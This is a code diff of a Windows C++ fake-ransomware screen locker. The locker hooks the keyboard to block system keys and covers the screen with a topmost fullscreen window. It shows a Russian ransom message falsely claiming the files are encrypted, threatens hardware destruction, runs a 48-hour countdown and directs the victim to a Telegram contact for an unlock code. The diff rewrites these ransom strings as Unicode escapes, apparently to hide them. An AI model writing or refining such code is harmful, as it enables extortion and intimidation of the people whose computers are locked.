@@ -1,120 +1,27 @@
-#include <windows.h>
-#include <string>
-#include <vector>
-
-const std::wstring PASSWORD = L"29042011";
-std::wstring input_text = L"";
-bool is_bsod = false;
-DWORD start_time = 0;
-int time_left = 48 * 60 * 60;
-DWORD last_timer_tick = 0;
-bool show_error = false;
-DWORD error_time = 0;
-std::wstring pc_name = L"DESKTOP-12345";
-
-HHOOK hKeyboardHook;
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB || p->vkCode == VK_ESCAPE) return 1;
-        if (GetAsyncKeyState(VK_MENU) & 0x8000) return 1; 
-        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) return 1; 
-        if (p->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
-    }
-    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
-}
-
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    switch (msg) {
-    case WM_CREATE:
-        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-        SetTimer(hwnd, 1, 100, NULL); 
-        {
-            wchar_t buf[256];
-            DWORD size = 256;
-            GetComputerNameW(buf, &size);
-            pc_name = buf;
-        }
-        start_time = GetTickCount();
-        last_timer_tick = GetTickCount();
-        return 0;
-
-    case WM_TIMER:
-        if (!is_bsod && GetTickCount() - start_time > 5000) {
-            is_bsod = true;
-            InvalidateRect(hwnd, NULL, TRUE);
-        }
-        if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
-            if (time_left > 0) time_left--;
-            last_timer_tick = GetTickCount();
-            InvalidateRect(hwnd, NULL, TRUE);
-        }
-        if (show_error && GetTickCount() - error_time > 3000) {
-            show_error = false;
-            InvalidateRect(hwnd, NULL, TRUE);
-        }
-        return 0;
-
-    case WM_CHAR:
-        if (is_bsod) {
-            if (wp == VK_BACK) {
-                if (!input_text.empty()) input_text.pop_back();
-            } else if (wp == VK_RETURN) {
-                if (input_text == PASSWORD) {
-                    PostQuitMessage(0);
-                } else {
-                    input_text.clear();
-                    show_error = true;
-                    error_time = GetTickCount();
-                }
-            } else if (wp >= 32 && wp <= 126 && input_text.length() < 15) {
-                input_text += (wchar_t)wp;
-            }
-            InvalidateRect(hwnd, NULL, TRUE);
-        }
-        return 0;
-
-    case WM_PAINT: {
-        PAINTSTRUCT ps;
-        HDC hdc = BeginPaint(hwnd, &ps);
-        RECT rect;
-        GetClientRect(hwnd, &rect);
-        
-        if (!is_bsod) {
-            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
-            RECT redRect = {0, rect.bottom / 4, rect.right, rect.bottom * 3 / 4};
-            HBRUSH redBrush = CreateSolidBrush(RGB(139, 0, 0));
-            FillRect(hdc, &redRect, redBrush);
-            DeleteObject(redBrush);
-            
-            SetBkMode(hdc, TRANSPARENT);
-            SetTextColor(hdc, RGB(255, 255, 255));
-            HFONT font = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, font);
-            
-            const wchar_t* art1 = L"         .:::.         \n       .:::::::.       \n      :::::::::::      \n     :::::::::::::     \n    :::::::::::::::    \n   :::::::::::::::::   \n  :::::::::::::::::::  \n ::::::::::::::::::::: \n:::::::::::::::::::::::";
-            DrawTextW(hdc, art1, -1, &redRect, DT_CENTER | DT_VCENTER);
-            
-            DeleteObject(font);
-        } else {
-            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
-            FillRect(hdc, &rect, blueBrush);
-            DeleteObject(blueBrush);
-            
-            SetBkMode(hdc, TRANSPARENT);
-            HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, font);
-
+            // Плашка сверху
             RECT whiteRect = {200, 100, 800, 130};
             HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &whiteRect, whiteBrush);
             DeleteObject(whiteBrush);
             SetTextColor(hdc, RGB(0, 0, 0));
-            DrawTextW(hdc, L" Ваши файлы зашифрованы! ", -1, &whiteRect, DT_CENTER | DT_VCENTER);
+            // " Ваши файлы зашифрованы! "
+            DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
             
             SetTextColor(hdc, RGB(255, 255, 255));
             RECT textRect = {200, 150, 800, 400};
-            const wchar_t* bsod_text = L"Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер\nзаблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской\nгруппировкой. Любые действия, связанные с попыткой обмануть систему,\nнанесут непоправимый вред вашему компьютеру и приведут к потере всех\nважных данных без возможности восстановления.\nБлокировку главный загрузчик материнки будет снесён, будет подана\nрекурсивная нагрузка на ваш процессор, что приведет к его неисправности.\nУ вас есть 48 часов с момента запуска чтобы ввести код,\nчто бы получить код, напиши               @opka8       (Telegram)";
+            
+            // Основной текст (кодированный)
+            const wchar_t* bsod_text = 
+                L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
+                L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
+                L"\u0433\u0440\u0443\u043f\u043f\u0438\u0440\u043e\u0432\u043a\u043e\u0439. \u041b\u044e\u0431\u044b\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f, \u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0441 \u043f\u043e\u043f\u044b\u0442\u043a\u043e\u0439 \u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443,\n"
+                L"\u043d\u0430\u043d\u0435\u0441\u0443\u0442 \u043d\u0435\u043f\u043e\u043f\u0440\u0430\u0432\u0438\u043c\u044b\u0439 \u0432\u0440\u0435\u0434 \u0432\u0430\u0448\u0435\u043c\u0443 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0443 \u0438 \u043f\u0440\u0438\u0432\u0435\u0434\u0443\u0442 \u043a \u043f\u043e\u0442\u0435\u0440\u0435 \u0432\u0441\u0435\u0445\n"
+                L"\u0432\u0430\u0436\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0431\u0435\u0437 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f.\n"
+                L"\u0411\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0443 \u0433\u043b\u0430\u0432\u043d\u044b\u0439 \u0437\u0430\u0433\u0440\u0443\u0437\u0447\u0438\u043a \u043c\u0430\u0442\u0435\u0440\u0438\u043d\u043a\u0438 \u0431\u0443\u0434\u0435\u0442 \u0441\u043d\u0435\u0441\u0451\u043d, \u0431\u0443\u0434\u0435\u0442 \u043f\u043e\u0434\u0430\u043d\u0430\n"
+                L"\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u0430\u044f \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043d\u0430 \u0432\u0430\u0448 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440, \u0447\u0442\u043e \u043f\u0440\u0438\u0432\u0435\u0434\u0435\u0442 \u043a \u0435\u0433\u043e \u043d\u0435\u0438\u0441\u043f\u0440\u0430\u0432\u043d\u043e\u0441\u0442\u0438.\n"
+                L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 48 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
+                L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
+            
             DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
             RECT inputRect = {200, 410, 800, 435};
@@ -122,7 +29,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             FillRect(hdc, &inputRect, inputBrush);
             DeleteObject(inputBrush);
             SetTextColor(hdc, RGB(0, 0, 0));
-            std::wstring display = L"Введите код разблокировки: " + input_text;
+            
+            // "Введите код разблокировки: "
+            std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
             DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
             SetTextColor(hdc, RGB(255, 255, 255));
@@ -134,7 +43,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             int mins = (time_left % 3600) / 60;
             int secs = time_left % 60;
             wchar_t timer_buf[100];
-            swprintf_s(timer_buf, L"ОСТАЛОСЬ ВРЕМЕНИ: %02d:%02d:%02d", hrs, mins, secs);
+            // "ОСТАЛОСЬ ВРЕМЕНИ: %02d:%02d:%02d"
+            swprintf_s(timer_buf, L"\u041e\u0421\u0422\u0410\u041b\u041e\u0421\u042c \u0412\u0420\u0415\u041c\u0415\u041d\u0418: %02d:%02d:%02d", hrs, mins, secs);
             SetTextColor(hdc, RGB(0, 255, 0));
             RECT timerRect = {200, 680, 800, 710};
             DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT);
@@ -145,33 +55,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 FillRect(hdc, &errRect, redBrush);
                 DeleteObject(redBrush);
                 SetTextColor(hdc, RGB(255, 255, 255));
-                DrawTextW(hdc, L"Замечена и остановлена попытка\nобмануть систему!", -1, &errRect, DT_CENTER | DT_VCENTER);
+                // "Замечена и остановлена попытка обмануть систему!"
+                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u0438 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430\n\u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443!", -1, &errRect, DT_CENTER | DT_VCENTER);
             }
-            DeleteObject(font);
-        }
-        EndPaint(hwnd, &ps);
-        return 0;
-    }
-    case WM_DESTROY:
-        UnhookWindowsHookEx(hKeyboardHook);
-        PostQuitMessage(0);
-        return 0;
-    }
-    return DefWindowProcW(hwnd, msg, wp, lp);
-}
-
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
-    WNDCLASSW wc = {0};
-    wc.lpfnWndProc = WndProc;
-    wc.hInstance = hInst;
-    wc.lpszClassName = L"LockerClass";
-    RegisterClassW(&wc);
-    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
-    ShowWindow(hwnd, SW_SHOW);
-    MSG msg;
-    while (GetMessageW(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
-    }
-    return 0;
-}
